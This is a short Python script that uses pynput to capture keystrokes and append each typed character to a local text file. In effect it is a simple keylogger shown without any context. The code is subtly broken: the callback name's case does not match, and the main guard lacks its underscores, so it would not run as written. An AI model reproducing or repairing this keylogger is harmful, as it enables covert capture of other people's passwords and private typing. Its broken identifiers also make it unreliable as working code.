from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("file.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if name == "main":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()